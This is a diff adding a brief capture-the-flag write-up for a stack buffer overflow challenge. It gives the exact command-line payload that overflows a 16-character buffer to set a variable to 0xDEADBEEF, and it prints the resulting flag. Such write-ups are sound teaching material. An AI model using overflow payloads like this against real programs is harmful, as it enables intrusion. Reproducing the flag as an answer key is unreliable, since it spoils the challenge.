@@ -1,0 +1,6 @@
+Looking at the source of the binary tell us that we have a 16 character buffer to overflow, and
+that we need to set the value of 'secret' to "0xDEADBEEF".
+
+$ ./overflow1 $(python -c "print 'A'*16+'\xEF\xBE\xAD\xDE'")
+$ cat flag.txt
+overflow_underflow_youreaflow_imaflow
